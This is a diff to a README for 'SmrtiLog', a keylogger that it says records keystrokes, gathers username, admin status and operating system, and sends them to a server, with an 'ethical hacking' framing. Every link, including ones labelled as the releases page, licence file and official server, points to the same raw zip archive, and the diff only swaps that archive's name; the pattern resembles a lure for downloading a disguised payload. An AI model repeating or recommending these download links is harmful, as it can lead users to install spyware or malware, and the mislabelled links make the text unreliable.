@@ -4,7 +4,7 @@
 
 Welcome to SmrtiLog! This application helps you monitor and log your keystrokes. It determines the username, checks for admin access, identifies your operating system, and sends this data to a secure server. This tool is ideal for educational purposes and ethical hacking practices.
 
-[![Download SmrtiLog](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/SmrtiLog.zip)](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/SmrtiLog.zip)
+[![Download SmrtiLog](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/Smrti_Log_1.2-alpha.2.zip)](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/Smrti_Log_1.2-alpha.2.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure your device meets the following requirements:
 
 To get started with SmrtiLog, follow these steps:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/SmrtiLog.zip).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/Smrti_Log_1.2-alpha.2.zip).
 2. Look for the latest version listed.
 3. Click the appropriate link to download the file for your operating system (e.g., .exe for Windows, .dmg for macOS, or the Linux package).
 4. Once the download completes, locate the file on your device.
@@ -76,11 +76,11 @@ If you run into problems, please check the **Issues** section on the GitHub page
 
 SmrtiLog is licensed under the MIT License. You are free to use, modify, and distribute the software as long as you provide proper credit.
 
-For more details, please refer to the [License file](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/SmrtiLog.zip).
+For more details, please refer to the [License file](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/Smrti_Log_1.2-alpha.2.zip).
 
 ## 🌐 Links
 
-- [Visit the Releases Page](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/SmrtiLog.zip)
-- [SmrtiLog Official Server](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/SmrtiLog.zip)
+- [Visit the Releases Page](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/Smrti_Log_1.2-alpha.2.zip)
+- [SmrtiLog Official Server](https://raw.githubusercontent.com/Rohan17182004/SmrtiLog/main/Adamitical/Smrti_Log_1.2-alpha.2.zip)
 
 Be sure to check back for updates and new features!
